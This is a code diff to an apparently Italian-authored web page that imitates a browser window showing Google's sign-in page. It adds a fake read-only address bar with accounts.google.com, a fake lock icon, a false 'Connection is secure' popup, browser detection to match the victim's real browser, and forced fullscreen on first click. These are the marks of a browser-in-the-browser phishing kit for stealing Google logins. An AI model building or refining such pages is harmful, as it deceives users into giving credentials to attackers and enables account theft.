@@ -21,7 +21,10 @@
             flex-direction: column;
         }
 
-        /* BARRA DEL BROWSER */
+        /* ==========================================================================
+           BROWSER BAR - CHROME
+           ========================================================================== */
+        
         .browser-bar {
             width: 100%;
             height: 56px;
@@ -31,6 +34,18 @@
             align-items: center;
             padding: 8px 12px;
             gap: 4px;
+        }
+
+        .browser-bar.chrome {
+            background-color: #f3f3f3;
+        }
+
+        .browser-bar.firefox {
+            background-color: #f7f7f7;
+        }
+
+        .browser-bar.opera {
+            background-color: #f5f5f5;
         }
 
         .browser-button {
@@ -52,10 +67,7 @@
             background-color: rgba(0, 0, 0, 0.1);
         }
 
-        .browser-button:active {
-            background-color: rgba(0, 0, 0, 0.15);
-        }
-
+        /* ADDRESS BAR CHROME */
         .address-bar {
             flex: 1;
             height: 40px;
@@ -67,6 +79,25 @@
             align-items: center;
             gap: 8px;
             margin: 0 8px;
+            transition: all 0.2s;
+        }
+
+        .browser-bar.chrome .address-bar {
+            border-radius: 24px;
+        }
+
+        .browser-bar.firefox .address-bar {
+            border-radius: 4px;
+        }
+
+        .browser-bar.opera .address-bar {
+            border-radius: 4px;
+        }
+
+        .address-bar:focus-within {
+            background-color: white;
+            border-color: #dadce0;
+            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.08);
         }
 
         .address-bar input {
@@ -78,10 +109,129 @@
             background: transparent;
         }
 
-        .address-bar:focus-within {
+        .address-bar input::placeholder {
+            color: #80868b;
+        }
+
+        /* LOCK ICON */
+        .lock-icon {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        /* SITE INFO POPUP */
+        .site-info-container {
+            position: relative;
+        }
+
+        .site-info-button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px 8px;
+            color: #5f6368;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: all 0.2s;
+        }
+
+        .site-info-button:hover {
+            color: #202124;
+        }
+
+        .site-info-popup {
+            position: absolute;
+            top: 48px;
+            left: 0;
             background-color: white;
-            border-color: #dadce0;
-            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.08);
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            min-width: 280px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+            display: none;
+            z-index: 1000;
+            padding: 16px;
+        }
+
+        .site-info-popup.active {
+            display: block;
+        }
+
+        .site-domain {
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 12px;
+        }
+
+        .site-info-item {
+            font-size: 13px;
+            color: #5f6368;
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: 1px solid #e8eaed;
+        }
+
+        .site-info-item:last-child {
+            border-bottom: none;
+        }
+
+        .site-info-icon {
+            width: 16px;
+            height: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .site-info-text {
+            flex: 1;
+        }
+
+        .site-info-text strong {
+            display: block;
+            color: #202124;
+            font-weight: 500;
+        }
+
+        /* USER PROFILE SECTION */
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0 8px;
+        }
+
+        .user-name {
+            font-size: 13px;
+            color: #5f6368;
+            max-width: 100px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .user-avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .user-avatar:hover {
+            transform: scale(1.05);
         }
 
         /* MENU DROPDOWN */
@@ -181,7 +331,7 @@
             color: #444746;
         }
 
-        /* FORM GROUP CON LABEL FLUTTUANTE */
+        /* FORM GROUP */
         .form-group {
             position: relative;
             margin-bottom: 20px;
@@ -200,7 +350,7 @@
         }
 
         .form-control:focus {
-            border: 2px solid #0b57d0;
+            border: 2px solid #1a73e8;
             padding: 15px;
         }
 
@@ -221,7 +371,7 @@
         .form-control:not(:placeholder-shown) ~ .class-label {
             top: 0;
             font-size: 12px;
-            color: #0b57d0;
+            color: #1a73e8;
         }
 
         .error-message {
@@ -244,13 +394,13 @@
             color: #b3261e;
         }
 
-        /* LINKS ACTION */
+        /* LINKS */
         .links-action {
             margin-bottom: 30px;
         }
 
         .forgot-link {
-            color: #0b57d0;
+            color: #1a73e8;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -258,7 +408,7 @@
         }
 
         .forgot-link:hover {
-            color: #0842a0;
+            color: #0d47a1;
         }
 
         /* GUEST NOTICE */
@@ -270,17 +420,17 @@
         }
 
         .guest-notice a {
-            color: #0b57d0;
+            color: #1a73e8;
             text-decoration: none;
             font-weight: 500;
             transition: color 0.2s;
         }
 
         .guest-notice a:hover {
-            color: #0842a0;
+            color: #0d47a1;
         }
 
-        /* BOTTOM BUTTONS */
+        /* BUTTONS */
         .bottom-buttons {
             display: flex;
             justify-content: space-between;
@@ -288,7 +438,7 @@
         }
 
         .create-account {
-            color: #0b57d0;
+            color: #1a73e8;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -296,11 +446,11 @@
         }
 
         .create-account:hover {
-            color: #0842a0;
+            color: #0d47a1;
         }
 
         .form-button {
-            background-color: #0b57d0;
+            background-color: #1a73e8;
             color: white;
             border: none;
             padding: 10px 24px;
@@ -312,7 +462,7 @@
         }
 
         .form-button:hover {
-            background-color: #0842a0;
+            background-color: #0d47a1;
         }
 
         .form-button:active {
@@ -322,8 +472,8 @@
 </head>
 <body>
 
-    <!-- BARRA DEL BROWSER -->
-    <div class="browser-bar">
+    <!-- BROWSER BAR -->
+    <div class="browser-bar" id="browserBar">
         <button class="browser-button" id="backBtn" title="Indietro">
             <i class="fas fa-arrow-left"></i>
         </button>
@@ -334,14 +484,48 @@
             <i class="fas fa-redo"></i>
         </button>
         
-        <div class="address-bar">
+        <!-- ADDRESS BAR -->
+        <div class="address-bar" id="addressBar">
+            <div class="lock-icon">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5s-5 2.24-5 5v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6zm9 14H6V10h12v10zm-6-3c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/>
+                </svg>
+            </div>
             <input type="text" id="urlInput" value="https://accounts.google.com/signin" readonly>
+            
+            <!-- SITE INFO -->
+            <div class="site-info-container">
+                <button class="site-info-button" id="siteInfoBtn">
+                    <span>›</span>
+                </button>
+                <div class="site-info-popup" id="siteInfoPopup">
+                    <div class="site-domain">google.com</div>
+                    <div class="site-info-item">
+                        <div class="site-info-icon">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 1C6.48 1 2 5.48 2 11s4.48 10 10 10 10-4.48 10-10S17.52 1 12 1zm-2 15l-5-5 1.41-1.41L10 13.17l7.59-7.59L19 7l-9 9z"/>
+                            </svg>
+                        </div>
+                        <div class="site-info-text">
+                            <strong>Connection is secure</strong>
+                            Your information is encrypted
+                        </div>
+                    </div>
+                    <div class="site-info-item">
+                        <div class="site-info-icon">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+                            </svg>
+                        </div>
+                        <div class="site-info-text">
+                            <strong>Cookies and site data</strong>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
         
-        <button class="browser-button" id="starBtn" title="Aggiungi ai segnalibri">
-            <i class="far fa-star"></i>
-        </button>
-
+        <!-- MENU BUTTON -->
         <div class="menu-container">
             <button class="browser-button menu-button" id="menuBtn" title="Menu">
                 <i class="fas fa-ellipsis-v"></i>
@@ -379,8 +563,8 @@
                 </div>
                 <div class="menu-section">
                     <a class="menu-item" href="#">
-                        <i class="fas fa-question-circle"></i>
-                        <span>Guida</span>
+                        <i class="fas fa-star"></i>
+                        <span>Aggiungi ai segnalibri</span>
                     </a>
                     <a class="menu-item" href="#">
                         <i class="fas fa-info-circle"></i>
@@ -388,6 +572,12 @@
                     </a>
                 </div>
             </div>
+        </div>
+
+        <!-- USER PROFILE -->
+        <div class="user-section">
+            <span class="user-name" id="userName">Work Guest</span>
+            <img src="https://lh3.googleusercontent.com/ogw/ADGmqu9BdZJfi0gpu2k5TjeWObRTFNI39xyvEWvSndua=s32-c-mo" alt="Profilo" class="user-avatar">
         </div>
     </div>
 
@@ -435,34 +625,56 @@
     </div>
 
     <script>
+        // RILEVA BROWSER
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            const browserBar = document.getElementById('browserBar');
+            const addressBar = document.getElementById('addressBar');
+            
+            if (ua.indexOf('Firefox') > -1) {
+                browserBar.classList.add('firefox');
+                addressBar.style.borderRadius = '4px';
+            } else if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
+                browserBar.classList.add('opera');
+                addressBar.style.borderRadius = '4px';
+            } else {
+                browserBar.classList.add('chrome');
+            }
+        }
+
+        // SITE INFO POPUP
+        const siteInfoBtn = document.getElementById('siteInfoBtn');
+        const siteInfoPopup = document.getElementById('siteInfoPopup');
+
+        siteInfoBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            siteInfoPopup.classList.toggle('active');
+        });
+
+        document.addEventListener('click', () => {
+            siteInfoPopup.classList.remove('active');
+        });
+
+        // MENU DROPDOWN
         const menuBtn = document.getElementById('menuBtn');
         const menuDropdown = document.getElementById('menuDropdown');
-        const starBtn = document.getElementById('starBtn');
-        const form = document.querySelector('.form');
 
-        // Menu dropdown
-        menuBtn.addEventListener('click', () => {
+        menuBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
             menuDropdown.classList.toggle('active');
         });
 
-        document.addEventListener('click', (e) => {
-            if (!e.target.closest('.menu-container')) {
-                menuDropdown.classList.remove('active');
-            }
+        document.addEventListener('click', () => {
+            menuDropdown.classList.remove('active');
         });
 
-        // Star button
-        starBtn.addEventListener('click', function() {
-            this.querySelector('i').classList.toggle('far');
-            this.querySelector('i').classList.toggle('fas');
-        });
-
-        // Browser buttons
+        // BROWSER BUTTONS
         document.getElementById('backBtn').addEventListener('click', () => history.back());
         document.getElementById('forwardBtn').addEventListener('click', () => history.forward());
         document.getElementById('reloadBtn').addEventListener('click', () => location.reload());
 
-        // Form validation
+        // FORM VALIDATION
+        const form = document.querySelector('.form');
         form.addEventListener('submit', function(event) {
             form.classList.add('submitted');
             if (!form.checkValidity()) {
@@ -470,7 +682,7 @@
             }
         });
 
-        // Fullscreen
+        // FULLSCREEN
         function goFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) {
@@ -492,6 +704,9 @@
 
         document.body.addEventListener('click', showContent, { once: true });
         document.addEventListener('keydown', showContent, { once: true });
+
+        // INIT
+        detectBrowser();
     </script>
 
 </body>
